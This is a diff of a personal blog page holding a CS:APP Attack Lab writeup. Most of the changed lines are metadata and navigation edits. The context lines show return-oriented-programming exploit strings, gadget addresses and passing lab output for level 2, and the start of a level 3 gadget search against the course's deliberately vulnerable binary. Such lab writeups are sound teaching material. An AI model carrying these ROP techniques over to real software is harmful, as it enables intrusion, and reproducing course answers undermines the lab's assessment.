@@ -104,7 +104,7 @@
 <meta property="og:site_name" content="无花果">
 <meta property="og:description" content="ROPlevel 2Requirement :   You can construct your solution using gadgets consisting of the following instruction types, and using only the ﬁrst eight x86-64 registers (%rax–%rdi).  According my origina">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-08-17T02:33:31.467Z">
+<meta property="og:updated_time" content="2019-10-22T06:21:06.847Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="CSAPP - AttackLab Writeup">
 <meta name="twitter:description" content="ROPlevel 2Requirement :   You can construct your solution using gadgets consisting of the following instruction types, and using only the ﬁrst eight x86-64 registers (%rax–%rdi).  According my origina">
@@ -427,12 +427,24 @@
                 
               
 
-              <time title="创建时间：2019年08月17日 10:31:26 / 修改时间：10:33:31" itemprop="dateCreated datePublished" datetime="2019-08-17T10:31:26+08:00">2019年08月17日</time>
+              <time title="创建时间：2019年08月17日 10:31:26" itemprop="dateCreated datePublished" datetime="2019-08-17T10:31:26+08:00">2019年08月17日</time>
             
 
             
               
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019年10月22日 14:21:06" itemprop="dateModified" datetime="2019-10-22T14:21:06+08:00">2019年10月22日</time>
               
             
           </span>
@@ -537,6 +549,7 @@
 <p>You can construct your solution using gadgets consisting of the following instruction types, and using only the ﬁrst eight x86-64 registers (%rax–%rdi).</p>
 </blockquote>
 <p>According my original Phase 2 answer:</p>
+<a id="more"></a>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">30 31 32 33 34 35 36 37 38 39   /* 34 characters padding */</span><br><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 </span><br><span class="line">bf fa 97 b9 59       	        /* mov    $0x59b997fa,%edi  */</span><br><span class="line">c3                   	        /* retq                     */</span><br><span class="line">9a dc 61 55 00 00 00 00         /* return addr shellcode: 0x5561dca0 &lt;- return ip (now) */</span><br><span class="line">ec 17 40 00 00 00 00 00 0a      /* return addr touch2 */</span><br></pre></td></tr></table></figure>
 <p>I should rewrite the <code>mov    $0x59b997fa,%edi</code> instruction using the gadgets given. </p>
 <p>I thought of laying the value 0x59b997fa on the stack and using <code>pop %rdi</code> instruction, which is encoded <code>5f</code>. </p>
@@ -544,7 +557,7 @@
 <p>Then I can easily write the following code.</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">30 31 32 33 34 35 36 37 38 39   /* 40 characters padding */</span><br><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 bf fa 97 b9 59 c3 </span><br><span class="line">1b 14 40 00 00 00 00 00         /* return rop: 0x40141b */</span><br><span class="line">fa 97 b9 59 00 00 00 00         /* the cookie value to be poped */</span><br><span class="line">ec 17 40 00 00 00 00 00 0a      /* return addr touch2 */</span><br></pre></td></tr></table></figure>
 <p>Results:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ainevsia@linux:~/target1$ ./rtarget -q -i exploit-raw.rl2</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:rtarget:2:30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 BF FA 97 B9 59 C3 1B 14 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 EC 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ainevsia@linux:~/target1$ ./rtarget -q -i exploit-raw.rl2</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:rtarget:2:30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 BF FA 97 B9 59 C3 1B 14 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 EC 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
 <h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>I think I should first make up the value <code>35 39 62 39 39 37 66 61</code> on the stack and I also need a pointer to it. How can i place the pointer on to the stack? </p>
 <p>Maybe <code>movq %rsp, %rdi</code> encoded <code>48 89 e7</code>, let’s find:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">4019a0:	8d 87 48 89 c7 c3    	movq %rax, %rdi</span><br><span class="line">401a03:	8d 87 41 48 89 e0 c3  	movq %rsp, %rax</span><br><span class="line">4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">4017bd:	c3                   	retq </span><br><span class="line">4019d8:                         add al, 0x37 ; ret</span><br></pre></td></tr></table></figure>
@@ -606,8 +619,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/08/15/NeuralNetwork-3b1b/" rel="next" title="神经网络学习笔记">
-                <i class="fa fa-chevron-left"></i> 神经网络学习笔记
+              <a href="/2019/08/15/NeuralNetwork-3b1b/" rel="next" title="神经网络学习笔记-3b1b">
+                <i class="fa fa-chevron-left"></i> 神经网络学习笔记-3b1b
               </a>
             
           </div>
@@ -616,7 +629,7 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/08/27/2019Summer/" rel="prev" title="A Guided Walk Through of OpenVPN">
+              <a href="/2019/08/27/OpenVPN/" rel="prev" title="A Guided Walk Through of OpenVPN">
                 A Guided Walk Through of OpenVPN <i class="fa fa-chevron-right"></i>
               </a>
             
@@ -937,7 +950,7 @@
     
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
     
-    <span title="站点阅读时长">1:31</span>
+    <span title="站点阅读时长">1:30</span>
   
 </div>
 
